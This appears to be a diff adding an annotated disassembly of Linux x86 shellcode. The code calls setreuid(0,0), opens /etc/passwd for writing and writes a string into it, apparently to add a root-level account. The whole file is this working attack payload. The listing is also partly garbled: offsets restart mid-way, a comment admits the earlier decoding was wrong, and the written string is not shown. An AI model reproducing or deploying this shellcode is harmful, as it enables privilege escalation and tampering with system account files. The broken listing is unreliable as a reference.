@@ -1,0 +1,33 @@
+00000000  31C9              xor ecx,ecx			; ECX = 0, set effective user ID (uid_t euid)
+00000002  89CB              mov ebx,ecx			; EBX = 0, set real user ID (uid_t ruid)
+00000004  6A46              push byte +0x46		; PUSH 0x46 (= 70 | setreuid) on stack
+00000006  58                pop eax			; POP 0x46 into EAX
+00000007  CD80              int 0x80			; syscall
+
+00000009  6A05              push byte +0x5		; PUSH 0x5 (= 5 | sys_open) on stack
+0000000B  58                pop eax			; EAX = 0x5
+0000000C  31C9              xor ecx,ecx			; ECX = 0
+0000000E  51                push ecx			; PUSH 0 on stack
+0000000F  6873737764        push dword 0x64777373	; "dwss"
+00000014  682F2F7061        push dword 0x61702f2f	; "ap//"
+00000019  682F657463        push dword 0x6374652f	; "cte/"
+0000001E  89E3              mov ebx,esp			; EBX points to args on stack
+00000020  41                inc ecx			; ECX = 0x00000001
+00000021  B504              mov ch,0x4			; ECX = 0x00000401 (argument flags: O_WRONLY, O_NOCTTY)
+00000023  CD80              int 0x80			; syscall
+
+00000025  93                xchg eax,ebx		; save returned file descriptor
+00000026  E823000000        call dword 0x4e		; pointer to string ("/etc/passwd")
+
+; From here the original instructions were incorrent. This can be ignored by skipping a few bytes:
+; echo -ne "\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
+
+00000000  59                pop ecx			; ECX = pointer to string ("/etc/passwd")
+00000001  8B51FC            mov edx,[ecx-0x4]		; EDX = length of string
+00000052  6A04              push byte +0x4		; PUSH 0x4 (= 4 | sys_write) on stack
+00000054  58                pop eax			; EAX = 4
+00000055  CD80              int 0x80			; syscall
+
+00000057  6A01              push byte +0x1		; PUSH 0x1 (= 1 | sys_exit) on stack
+00000059  58                pop eax			; EAX = 0x1
+0000005A  CD80              int 0x80			; syscall
